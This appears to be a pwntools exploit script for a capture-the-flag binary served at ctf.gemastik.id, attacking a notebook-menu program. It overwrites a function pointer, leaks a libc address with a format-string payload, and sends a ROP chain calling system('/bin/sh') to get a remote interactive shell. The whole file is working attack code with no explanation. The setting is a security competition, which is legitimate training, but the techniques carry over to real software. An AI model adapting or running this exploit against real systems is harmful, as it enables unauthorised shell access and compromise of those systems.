#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'

PATH = './chall'

HOST = 'ctf.gemastik.id'
PORT = 11101


def add_notebook(idx, title, content):
    r.sendlineafter(b': ', b'1')
    r.sendlineafter(b': ', f'{idx}'.encode())
    r.sendlineafter(b': ', title)
    r.sendlineafter(b': ', content)

def remove_notebook(idx):
    r.sendlineafter(b': ', b'2')
    r.sendlineafter(b': ', f'{idx}'.encode())
    
def add_feedback(data):
    r.sendlineafter(b': ', b'3')
    r.sendlineafter(b': ', data)

def exploit(r):
    add_notebook(18, 
        p64(elf.sym.addFeedback), 
        b'A' * 8) 
    
    call_printf = elf.sym.addFeedback + 0xF
    feedback = 0x404e28
    
    add_feedback(b'%3$p||||' + (b'A' * 0x38) + p64(feedback - 8) + p64(call_printf))
    
    libc_stdin = eval(r.recv().split(b'|')[0])
    libc.address = libc_stdin - libc.sym._IO_2_1_stdin_
    
    info(f'stdin @ {hex(libc_stdin)}')
    info(f'libc @ {hex(libc.address)}')
    
    pop_rdi_ret = next(libc.search(asm('pop rdi; ret')))


    r.sendline(b'A' * 0x48 + 
               p64(pop_rdi_ret) + p64(next(libc.search(b'/bin/sh'))) + 
               p64(pop_rdi_ret + 1) + p64(libc.sym.system))

    
    r.interactive()

if __name__ == '__main__':
    elf = ELF(PATH, checksec=True)
    libc = ELF('./libc.so.6', checksec=False)

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = elf.process(aslr=False, env={})
    exploit(r)